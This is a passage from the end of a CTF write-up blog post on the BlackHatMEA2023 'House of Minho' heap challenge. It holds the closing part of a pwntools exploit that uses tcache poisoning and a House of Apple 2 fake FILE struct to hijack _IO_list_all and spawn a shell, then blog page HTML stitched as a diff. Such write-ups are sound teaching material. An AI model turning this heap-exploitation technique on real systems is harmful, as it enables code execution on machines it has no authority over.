pack(<span class="number">0xd00</span>))</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span> + pack(<span class="number">0x90</span>) + pack(<span class="number">0x10</span>) + pack(<span class="number">0</span>) + pack(<span class="number">0x11</span>)) <span class="comment"># taken from tcache, but actually a very big chunk (0xd00) overlaping with the old top chunk which is in unsorted bin</span></span><br><span class="line">    free() <span class="comment"># trigger a consolidate with the 0x31 fake chunk in chunk-0x40, now we have a fake chunk in unsorted bin</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + pack(<span class="number">0</span>) + pack(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&#x27;0&#x27;</span>*<span class="number">0xfff</span>+<span class="string">b&#x27;2&#x27;</span>) <span class="comment"># trigger malloc to the big-unsorted-bin-loop and put the fake chunk in chunk-0x40 into small bin</span></span><br><span class="line"></span><br><span class="line">    free()</span><br><span class="line">    <span class="comment"># construct a fake smallbin-linked list</span></span><br><span class="line">    add(<span class="number">1</span>, flat([</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0x91</span>, heap_base+<span class="number">0x2c0</span>, heap_base+<span class="number">0x2c0</span>+<span class="number">0x20</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0x91</span>, heap_base+<span class="number">0x2c0</span>, heap_base+<span class="number">0x2c0</span>+<span class="number">0x40</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0x91</span>, heap_base+<span class="number">0x2c0</span>+<span class="number">0x20</span>, libc_base+<span class="number">0x219d60</span>,</span><br><span class="line">    ]))</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment"># trigger smallbin-to-tcache process</span></span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># House of Apple 2</span></span><br><span class="line"></span><br><span class="line">    wide_data_off = <span class="number">0xa0</span></span><br><span class="line">    vtable_off = <span class="number">0xd8</span></span><br><span class="line">    wide_data_vtable_off = <span class="number">0xe0</span></span><br><span class="line">    _IO_wfile_overflow_ptr = libc_base+<span class="number">0x2160d8</span></span><br><span class="line">    __overflow_off = <span class="number">0x18</span></span><br><span class="line">    do_alloc_off = <span class="number">0x68</span></span><br><span class="line">    _IO_list_all = libc_base+<span class="number">0x21a680</span></span><br><span class="line">    system = libc_base+<span class="number">0x50d60</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># we can&#x27;t hijack data in standard FILE struct directly because we have only *one* 0x80 bytes arbitrary write</span></span><br><span class="line">    <span class="comment"># so we have to fake a FILE struct on heap and hijack the _IO_list_all pointer to it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># heap_base + 0x2d0 is the chunk_0x80(content), heap_base + 0x2c0 is the chunk_0x40(content)</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64((heap_base + <span class="number">0x2d0</span> + <span class="number">0x70</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">2</span>, flat(&#123;</span><br><span class="line">        <span class="number">0x10</span>: <span class="string">b&quot;  sh;&quot;</span>, <span class="comment"># fake FILE struct starts at heap_base + 0x2e0</span></span><br><span class="line">        <span class="number">0x38</span>: system,</span><br><span class="line">        <span class="number">0x68</span>: <span class="number">0x71</span>,</span><br><span class="line">        <span class="number">0x70</span>: _IO_list_all ^ (heap_base &gt;&gt; <span class="number">12</span>),</span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">2</span>, flat(&#123; <span class="comment"># starts from heap_base + 0x2e0 + 0x60</span></span><br><span class="line">        wide_data_off-<span class="number">0x60</span>: heap_base + <span class="number">0x2e0</span> + <span class="number">0xd0</span> - wide_data_vtable_off,</span><br><span class="line">        <span class="number">0xd0</span>-<span class="number">0x60</span>:          heap_base + <span class="number">0x2e0</span> + <span class="number">0x28</span> - do_alloc_off,</span><br><span class="line">        vtable_off-<span class="number">0x60</span>:    _IO_wfile_overflow_ptr - __overflow_off,</span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">2</span>, pack(heap_base+<span class="number">0x2e0</span>))   <span class="comment"># hijack _IO_list_all</span></span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>) <span class="comment"># trigger exit -&gt; ... -&gt; _IO_flush_all_lockp -&gt;_IO_overflow</span></span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------ Infrastructure ------------------ #</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    g = gdb.attach(io, <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        source ~/gaio/load_sym.py</span></span><br><span class="line"><span class="string">        loadsym ~/gaio/libs/2.35-0ubuntu3_amd64/.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        io = process(filename)</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">        io = process(filename)</span><br><span class="line">        debug()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">        io = remote(ip, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: ./exp.py [d | r]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\td for debug&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\tr for remote&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://www.cameudis.com">Cameudis</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://www.cameudis.com/Tech/PWN/576345e2f0f6.html">https://www.cameudis.com/Tech/PWN/576345e2f0f6.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="https://i.imgtg.com/2023/04/11/8z0Vl.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/Daily/df1454eccbba.html" title="博客更新计划"><img class="cover" src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">博客更新计划</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/ava1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Cameudis</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">16</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%A6%82%E5%86%B5"><span class="toc-text">程序概况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E6%A6%82%E6%8B%AC"><span class="toc-text">攻击思路概括</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E8%A7%A3%E6%9E%90"><span class="toc-text">具体攻击流程解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-text">信息泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smallbin-to-tcache%EF%BC%88%E6%9C%AC%E9%A2%98%E5%85%B3%E9%94%AE%EF%BC%89"><span class="toc-text">smallbin to tcache（本题关键）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-poisoning-amp-House-of-Apple2"><span class="toc-text">tcache poisoning &amp; House of Apple2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-%E8%84%9A%E6%9C%AC"><span class="toc-text">EXP 脚本</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Tech/PWN/576345e2f0f6.html" title="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup"/></a><div class="content"><a class="title" href="/Tech/PWN/576345e2f0f6.html" title="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup">【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup</a><time datetime="2024-04-18T05:22:03.000Z" title="Created 2024-04-18 13:22:03">2024-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Daily/df1454eccbba.html" title="博客更新计划"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客更新计划"/></a><div class="content"><a class="title" href="/Daily/df1454eccbba.html" title="博客更新计划">博客更新计划</a><time datetime="2024-04-17T07:05:32.000Z" title="Created 2024-04-17 15:05:32">2024-04-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Music/20db37a1b726.html" title="【Music】私のBAND"><img src="https://i.imgtg.com/2023/04/11/8z0Vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Music】私のBAND"/></a><div class="content"><a class="title" href="/Music/20db37a1b726.html" title="【Music】私のBAND">【Music】私のBAND</a><time datetime="2024-03-15T13:52:47.000Z" title="Created 2024-03-15 21:52:47">2024-03-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://i.imgtg.com/2023/04/11/8zHiD.png')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Cameudis</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Exp10re the W0r1d!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
-  const initValine = () => {
-    const valine = new Valine(Object.assign({
-      el: '#vcomment',
-      appId: 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
-      appKey: '6VqGye1352LX381YQDTOaiXs',
-      avatar: 'retro',
-      serverURLs: '',
-      emojiMaps: "",
-      path: window.location.pathname,
-      visitor: true
-    }, [{"placeholder":"El Psy Congroo"}]))
-  }
 
-  const loadValine = async () => {
-    if (typeof Valine === 'function') initValine()
-    else {
-      await getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
-      initValine()
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Daily/df1454eccbba.html" rel="prev" title="博客更新计划">
+      <i class="fa fa-chevron-left"></i> 博客更新计划
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
     }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
   }
+</script>
 
-  if ('Valine' === 'Valine' || !false) {
-    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
-    else setTimeout(loadValine, 0)
-  } else {
-    window.loadOtherComment = loadValine
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E6%A6%82%E5%86%B5"><span class="nav-number">1.</span> <span class="nav-text">程序概况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E6%A6%82%E6%8B%AC"><span class="nav-number">2.</span> <span class="nav-text">攻击思路概括</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E8%A7%A3%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">具体攻击流程解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="nav-number">3.1.</span> <span class="nav-text">信息泄漏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smallbin-to-tcache%EF%BC%88%E6%9C%AC%E9%A2%98%E5%85%B3%E9%94%AE%EF%BC%89"><span class="nav-number">3.2.</span> <span class="nav-text">smallbin to tcache（本题关键）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-poisoning-amp-House-of-Apple2"><span class="nav-number">3.3.</span> <span class="nav-text">tcache poisoning &amp; House of Apple2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-%E8%84%9A%E6%9C%AC"><span class="nav-number">4.</span> <span class="nav-text">EXP 脚本</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cameudis"
+      src="/images/ava1.jpg">
+  <p class="site-author-name" itemprop="name">Cameudis</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cameudis" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:cameudis@gmail.com" title="E-Mail → mailto:cameudis@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://x.com/cameudis" title="Twitter → https:&#x2F;&#x2F;x.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-dove"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cameudis</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
   }
-})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
+      appKey     : '6VqGye1352LX381YQDTOaiXs',
+      placeholder: "El Psy Congroo",
+      avatar     : 'retro',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+    </div>
+</body>
+</html>
